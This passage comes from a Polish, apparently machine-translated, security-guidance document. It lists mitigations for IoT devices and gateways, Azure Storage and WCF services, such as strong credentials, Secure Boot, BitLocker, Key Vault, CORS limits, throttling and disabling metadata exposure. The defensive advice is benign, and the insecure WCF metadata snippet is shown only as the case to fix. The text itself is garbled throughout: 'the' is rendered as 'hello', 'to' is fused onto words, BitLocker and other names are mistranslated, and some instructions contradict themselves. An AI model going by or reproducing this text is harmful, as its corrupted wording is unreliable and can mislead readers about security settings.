| **Odwołania**              | [Porady: Szyfrowanie sekcji konfiguracyjnych w DPAPI za pomocą programu ASP.NET 2.0](https://msdn.microsoft.com/library/ff647398.aspx), [określenie dostawcę konfiguracji chronione](https://msdn.microsoft.com/library/68ze1hb2.aspx), [klucze tajne aplikacji tooprotect przy użyciu usługi Azure Key Vault](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Kroki** | Pliki konfiguracji, takich jak hello Web.config, appsettings.json są często używane toohold informacji poufnych, w tym nazwy użytkownika, hasła, parametry połączenia bazy danych i kluczy szyfrowania. Jeśli nie będzie chronić te informacje, aplikacja jest narażony tooattackers lub złośliwym użytkownikom uzyskania poufne informacje, takie jak nazwy kont i hasła, nazwy bazy danych i nazwy serwera. Oparte na powitania typ wdrożenia (azure/lokalnego), szyfrowanie hello poufnych sekcjami plików konfiguracji przy użyciu DPAPI lub usługi, takie jak usługi Azure Key Vault. |

## <a id="admin-strong"></a>Upewnij się, że wszystkich interfejsów administracyjnych są zabezpieczony z silnych poświadczeń

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Wszystkie administracyjne interfejsy urządzenia hello lub ujawnia bramy pola powinny być chronione za pomocą silnych poświadczeń. Ponadto innych interfejsów, takich jak Wi-Fi, SSH, udziałów plików, FTP, powinny być zabezpieczone przy użyciu poświadczeń silne. Nie należy używać domyślnej słabe hasła. |

## <a id="unknown-exe"></a>Upewnij się, że nieznany kod nie można wykonać na urządzeniach

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie bezpiecznego rozruchu i skrytki bitowego szyfrowania urządzenia w systemie Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Kroki** | Bezpiecznego rozruchu UEFI ogranicza systemu hello tooonly umożliwia wykonanie podpisane przez określony urząd plików binarnych. Ta funkcja zapobiega nieznany kod wykonywany na platformie hello i potencjalnie osłabienia hello stan zabezpieczeń go. Włączanie bezpiecznego rozruchu UEFI i ograniczenia hello listy urzędów certyfikacji, które są zaufane do podpisywania kodu. Zaloguj się całego kodu, który jest wdrożony na urządzeniu hello przy użyciu jednej z hello zaufanych urzędów. |

## <a id="partition-iot"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzenia IoT z bitowego skrytki

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Windows 10 IoT Core implementuje to Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która ma silne zależność na powitania obecności modułu TPM na platformie hello, w tym protokołu niezbędne preOS hello w oprogramowaniu układowym UEFI, który prowadzi hello niezbędnych pomiarów. Pomiary preOS upewnij się, że hello systemu operacyjnego zawiera później ostateczne rekord jak hello systemu operacyjnego została uruchomiona. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="min-enable"></a>Upewnij się, że tylko hello minimalna/funkcje usług są włączone na urządzeniach

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Nie włączaj ani wyłączyć wszystkie funkcje lub usług w hello systemu operacyjnego, który nie jest wymagany dla hello funkcjonowania rozwiązania hello. Na przykład jeśli urządzenie hello nie wymaga toobe interfejsu użytkownika, wdrożone, instalowanie systemu Windows IoT Core w trybie bezobsługowe. |

## <a id="field-bit-locker"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje IoT pola bramy z bitowego skrytki

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Pole IoT bramy | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Windows 10 IoT Core implementuje to Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która ma silne zależność na powitania obecności modułu TPM na platformie hello, w tym protokołu niezbędne preOS hello w oprogramowaniu układowym UEFI, który prowadzi hello niezbędnych pomiarów. Pomiary preOS upewnij się, że hello systemu operacyjnego zawiera później ostateczne rekord jak hello systemu operacyjnego została uruchomiona. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="default-change"></a>Upewnij się, że poświadczenia logowania domyślne hello hello pola bramy są zmieniane podczas instalacji

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Pole IoT bramy | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Upewnij się, że poświadczenia logowania domyślne hello hello pola bramy są zmieniane podczas instalacji |

## <a id="cloud-firmware"></a>Upewnij się, że proces tookeep hello podłączone urządzenia oprogramowania układowego się toodate implementuje tego hello bramy chmury

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama chmury IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Wybór bramy - Centrum IoT Azure |
| **Odwołania**              | [Omówienie zarządzania urządzeniami Centrum IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [jak tooupdate oprogramowanie układowe urządzenia](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Kroki** | LWM2M jest protokołem z hello Open Mobile Alliance do zarządzania urządzeniami IoT. Zarządzanie urządzeniami w usłudze Azure IoT umożliwia toointeract z urządzeń fizycznych przy użyciu zadań urządzenia. Upewnij się, że hello bramy chmury implementuje procesu tooroutinely zachować hello urządzenia i inne dane konfiguracyjne się toodate przy użyciu zarządzania urządzeniami Centrum IoT Azure. |

## <a id="controls-policies"></a>Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Granic zaufania maszyny | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | Upewnij się, czy urządzenia mają formanty zabezpieczeń punktu końcowego, takie jak skrytka na bit do szyfrowania na poziomie dysku, oprogramowanie antywirusowe zaktualizowane podpisów, zapory oparte na, uaktualnień systemu operacyjnego hosta, grupy zasad są skonfigurowane itp., zgodnie z zasadami zabezpieczeń organizacji. |

## <a id="secure-keys"></a>Zapewnienia bezpiecznego zarządzania kluczami dostępu do magazynu Azure

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Przewodnik zabezpieczeń magazynu Azure — Zarządzanie Twoje klucze konta magazynu](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroki** | <p>Magazynu kluczy: Ona zaleca się klucze dostępu toostore hello Azure Storage w usłudze Azure Key Vault jako klucz tajny i mieć aplikacji hello pobrać klucz hello z magazynu kluczy. Jest to zalecane powodu toohello następujących powodów:</p><ul><li>Aplikacja Hello nigdy nie będą miały hello magazynu kluczy ustalony w pliku konfiguracji, co spowoduje usunięcie tej osoby uzyskiwania dostępu do kluczy toohello bez wyraźnej zgody ścieżek</li><li>Klawisze dostępu toohello można kontrolować przy użyciu usługi Azure Active Directory. Oznacza to, że konto może udzielić dostępu toohello grupy aplikacji, które muszą tooretrieve hello kluczy z usługi Azure Key Vault. Inne aplikacje nie będą mogli tooaccess hello kluczy bez przyznania im uprawnień w szczególności</li><li>Ponowne generowanie klucza: Zalecane jest toohave procesu w miejscu tooregenerate dostępu do magazynu Azure kluczy ze względów bezpieczeństwa. Szczegółowe informacje o dlaczego i w jaki sposób tooplan dla ponowne generowanie klucza są udokumentowane w artykule hello przewodnik zabezpieczeń magazynu Azure odwołania artykułu</li></ul>|

## <a id="cors-storage"></a>Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w magazynie Azure

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Obsługa mechanizmu CORS hello usług magazynu Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroki** | Magazyn Azure umożliwia tooenable CORS — Cross udostępniania zasobów pochodzenia. Dla każdego konta magazynu można określić domeny, które mogą uzyskiwać dostęp do zasobów hello na tym koncie magazynu. Domyślnie CORS jest wyłączona na wszystkich usług. Mechanizm CORS można włączyć, używając hello interfejsu API REST lub hello magazynu klienta biblioteki toocall jedną z hello metody tooset hello usługi zasad. |

## <a id="throttling"></a>Włącz usługę WCF dla funkcji ograniczania

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | .NET framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [uzyskania zawartości Królestwo](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroki** | <p>Nie wprowadzania limit na powitania Użyj systemu zasobów może spowodować wyczerpanie zasobów, a ostatecznie jest przesyłany do odmowy usługi.</p><ul><li>**Wyjaśnienie:** żądania obsługi toothrottle możliwości hello oferuje Windows Communication Foundation (WCF). Stosowanie zbyt wiele żądań klientów można wypełniania systemu i spalin jego zasoby. Na powitania drugiej strony, dzięki czemu tylko niewielka liczba żądań usługi tooa można uniemożliwić przy użyciu usługi hello autoryzowanych użytkowników. Każda usługa powinna być indywidualnie Zaczekaj tooand skonfigurowane tooallow hello odpowiednią ilość zasobów.</li><li>**Zalecenia dotyczące** funkcji ograniczania przepustowości usługi i ustawianie limitów włączyć WCF odpowiednie dla twojej aplikacji.</li></ul>|

### <a name="example"></a>Przykład
Hello poniżej przedstawiono przykładową konfigurację po zastosowaniu ograniczania włączone.
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Ujawnienie informacji WCF za pomocą metadanych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | .NET framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [uzyskania zawartości Królestwo](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroki** | Osoby atakujące plan forma ataku i Dowiedz się więcej o hello systemu może pomóc w metadanych. Usługi WCF może być skonfigurowany tooexpose metadanych. Metadane udostępnia usługi szczegółowy opis informacji i nie powinien być emisji w środowiskach produkcyjnych. Witaj `HttpGetEnabled`  /  `HttpsGetEnabled` właściwości klasy ServiceMetaData hello definiuje, czy usługa uwidoczni hello metadanych | 

### <a name="example"></a>Przykład
Poniższy kod Hello nakazuje WCF toobroadcast metadanych usługi
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Emituje metadanych usługi w środowisku produkcyjnym. Ustaw hello HttpGetEnabled / HttpsGetEnabled właściwości hello ServiceMetaData klas toofalse. 

### <a name="example"></a>Przykład
Poniższy kod Hello nakazuje się, że WCF toonot emisji metadanych usługi. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
